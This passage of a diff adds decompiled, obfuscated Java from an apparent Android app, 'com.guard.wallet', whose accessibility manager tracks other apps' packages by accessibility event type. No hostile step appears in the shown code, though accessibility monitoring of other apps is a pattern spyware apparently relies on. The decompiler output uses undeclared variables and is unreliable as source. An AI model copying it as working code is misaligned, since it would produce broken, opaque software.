+         } catch (Exception var4) {
+            var10000 = var4;
+            boolean var10001 = false;
+            break label30;
+         }
+
+         while (true) {
+            boolean var1;
+            try {
+               if (!var5.hasNext()) {
+                  return false;
+               }
+
+               var1 = (e)var5.next() instanceof o;
+            } catch (Exception var3) {
+               var10000 = var3;
+               boolean var7 = false;
+               break;
+            }
+
+            if (var1) {
+               return true;
+            }
+         }
+      }
+
+      Exception var6 = var10000;
+      q.s("com.guard.wallet.service.AccessibilityDelegateManager", var6);
+      return false;
+   }
+
+   public final t n() {
+      ConcurrentLinkedQueue var1 = this.a;
+
+      try {
+         if (!var1.isEmpty()) {
+            for (e var4 : var1) {
+               if (var4 instanceof t) {
+                  return (t)var4;
+               }
+            }
+         }
+      } catch (Exception var3) {
+         q.s("com.guard.wallet.service.AccessibilityDelegateManager", var3);
+      }
+
+      return null;
+   }
+
+   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
+   public final boolean o() {
+      ConcurrentLinkedQueue var2 = this.a;
+
+      Exception var10000;
+      label30: {
+         try {
+            if (var2.isEmpty()) {
+               return false;
+            }
+
+            var5 = var2.iterator();
+         } catch (Exception var4) {
+            var10000 = var4;
+            boolean var10001 = false;
+            break label30;
+         }
+
+         while (true) {
+            boolean var1;
+            try {
+               if (!var5.hasNext()) {
+                  return false;
+               }
+
+               var1 = (e)var5.next() instanceof x;
+            } catch (Exception var3) {
+               var10000 = var3;
+               boolean var7 = false;
+               break;
+            }
+
+            if (var1) {
+               return true;
+            }
+         }
+      }
+
+      Exception var6 = var10000;
+      q.s("com.guard.wallet.service.AccessibilityDelegateManager", var6);
+      return false;
+   }
+
+   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
+   public final boolean p() {
+      ConcurrentLinkedQueue var2 = this.a;
+
+      Exception var10000;
+      label30: {
+         try {
+            if (var2.isEmpty()) {
+               return false;
+            }
+
+            var5 = var2.iterator();
+         } catch (Exception var4) {
+            var10000 = var4;
+            boolean var10001 = false;
+            break label30;
+         }
+
+         while (true) {
+            boolean var1;
+            try {
+               if (!var5.hasNext()) {
+                  return false;
+               }
+
+               var1 = (e)var5.next() instanceof a0;
+            } catch (Exception var3) {
+               var10000 = var3;
+               boolean var7 = false;
+               break;
+            }
+
+            if (var1) {
+               return true;
+            }
+         }
+      }
+
+      Exception var6 = var10000;
+      q.s("com.guard.wallet.service.AccessibilityDelegateManager", var6);
+      return false;
+   }
+
+   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
+   public final void q(String var1) {
+      Exception var10000;
+      label32: {
+         boolean var2;
+         try {
+            var2 = q.B(var1);
+         } catch (Exception var5) {
+            var10000 = var5;
+            boolean var10001 = false;
+            break label32;
+         }
+
+         if (var2) {
+            return;
+         }
+
+         ConcurrentLinkedQueue var3 = this.c;
+
+         try {
+            if (!var3.contains(var1)) {
+               var3.offer(var1);
+            }
+
+            return;
+         } catch (Exception var4) {
+            var10000 = var4;
+            boolean var7 = false;
+         }
+      }
+
+      Exception var6 = var10000;
+      q.s("com.guard.wallet.service.AccessibilityDelegateManager", var6);
+   }
+
+   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
+   public final void r(String var1) {
+      Exception var10000;
+      label32: {
+         boolean var2;
+         try {
+            var2 = q.B(var1);
+         } catch (Exception var5) {
+            var10000 = var5;
+            boolean var10001 = false;
+            break label32;
+         }
+
+         if (var2) {
+            return;
+         }
+
+         ConcurrentLinkedQueue var3 = this.d;
+
+         try {
+            if (!var3.contains(var1)) {
+               var3.offer(var1);
+            }
+
+            return;
+         } catch (Exception var4) {
+            var10000 = var4;
+            boolean var7 = false;
+         }
+      }
+
+      Exception var6 = var10000;
+      q.s("com.guard.wallet.service.AccessibilityDelegateManager", var6);
+   }
+
+   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
+   public final void s(String var1) {
+      Exception var10000;
+      label32: {
+         boolean var2;
+         try {
+            var2 = q.B(var1);
+         } catch (Exception var5) {
+            var10000 = var5;
+            boolean var10001 = false;
+            break label32;
+         }
+
+         if (var2) {
+            return;
+         }
+
+         ConcurrentLinkedQueue var3 = this.b;
+
+         try {
+            if (!var3.contains(var1)) {
+               var3.offer(var1);
+            }
+
+            return;
+         } catch (Exception var4) {
+            var10000 = var4;
+            boolean var7 = false;
+         }
+      }
+
+      Exception var6 = var10000;
+      q.s("com.guard.wallet.service.AccessibilityDelegateManager", var6);
+   }
+
+   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
+   public final void t(String var1, List var2) {
+      if (var2 != null) {
+         Exception var10000;
+         label60: {
+            try {
+               if (var2.isEmpty()) {
+                  return;
+               }
+
+               var10 = var2.iterator();
+            } catch (Exception var8) {
+               var10000 = var8;
+               boolean var10001 = false;
+               break label60;
+            }
+
+            while (true) {
+               ListenWindow var3;
+               try {
+                  if (!var10.hasNext()) {
+                     return;
+                  }
+
+                  var3 = (ListenWindow)var10.next();
+               } catch (Exception var6) {
+                  var10000 = var6;
+                  boolean var11 = false;
+                  break;
+               }
+
+               if (var3 != null) {
+                  try {
+                     if (var3.getEventTypes() != null && !var3.getEventTypes().isEmpty() && var3.getEventTypes().contains(2048)) {
+                        this.s(var3.getPackageName());
+                     }
+                  } catch (Exception var5) {
+                     var10000 = var5;
+                     boolean var12 = false;
+                     break;
+                  }
+
+                  try {
+                     if (var3.getEventTypes() != null && !var3.getEventTypes().isEmpty() && var3.getEventTypes().contains(j)) {
+                        this.q(var3.getPackageName());
+                     }
+                  } catch (Exception var7) {
+                     var10000 = var7;
+                     boolean var13 = false;
+                     break;
+                  }
+
+                  try {
+                     this.r(com.guard.wallet.utils.SystemHelper.v0(var3.getPackageName(), var3.getClassName(), var1));
+                  } catch (Exception var4) {
+                     var10000 = var4;
+                     boolean var14 = false;
+                     break;
+                  }
+               }
+            }
+         }
+
+         Exception var9 = var10000;
+         q.s("com.guard.wallet.service.AccessibilityDelegateManager", var9);
+      }
+   }
+
+   public final void u() {
+      ConcurrentLinkedQueue var1 = this.a;
+
+      try {
+         if (!var1.isEmpty()) {
+            DelegateRemovePredicate var2 = new DelegateRemovePredicate(this, 6);
+            var1.removeIf(var2);
+         }
+      } catch (Exception var3) {
+         q.s("com.guard.wallet.service.AccessibilityDelegateManager", var3);
+      }
+   }
+
+   public final void v() {
+      ConcurrentLinkedQueue var2 = this.a;
+
+      try {
+         if (!var2.isEmpty()) {
+            DelegateRemovePredicate var1 = new DelegateRemovePredicate(this, 0);
+            var2.removeIf(var1);
+         }
+      } catch (Exception var3) {
+         q.s("com.guard.wallet.service.AccessibilityDelegateManager", var3);
+      }
+   }
+
+   public final void w() {
+      ConcurrentLinkedQueue var1 = this.a;
+
+      try {
+         if (!var1.isEmpty()) {
+            DelegateRemovePredicate var2 = new DelegateRemovePredicate(this, 3);
+            var1.removeIf(var2);
+         }
+      } catch (Exception var3) {
+         q.s("com.guard.wallet.service.AccessibilityDelegateManager", var3);
+      }
+   }
+
+   public final void x() {
+      ConcurrentLinkedQueue var1 = this.a;
+
+      try {
+         if (!var1.isEmpty()) {
+            DelegateRemovePredicate var2 = new DelegateRemovePredicate(this, 1);
+            var1.removeIf(var2);
+         }
+      } catch (Exception var3) {
+         q.s("com.guard.wallet.service.AccessibilityDelegateManager", var3);
+      }
+   }
+
+   public final void y() {
+      ConcurrentLinkedQueue var2 = this.a;
+
+      try {
+         if (!var2.isEmpty()) {
+            DelegateRemovePredicate var1 = new DelegateRemovePredicate(this, 2);
+            var2.removeIf(var1);
+         }
+      } catch (Exception var3) {
+         q.s("com.guard.wallet.service.AccessibilityDelegateManager", var3);
+      }
+   }
+
+   public final void z() {
+      ConcurrentLinkedQueue var2 = this.a;
+
+      try {
+         if (!var2.isEmpty()) {
+            DelegateRemovePredicate var1 = new DelegateRemovePredicate(this, 8);
+            var2.removeIf(var1);
+         }
+      } catch (Exception var3) {
+         q.s("com.guard.wallet.service.AccessibilityDelegateManager", var3);
+      }
+   }
+}
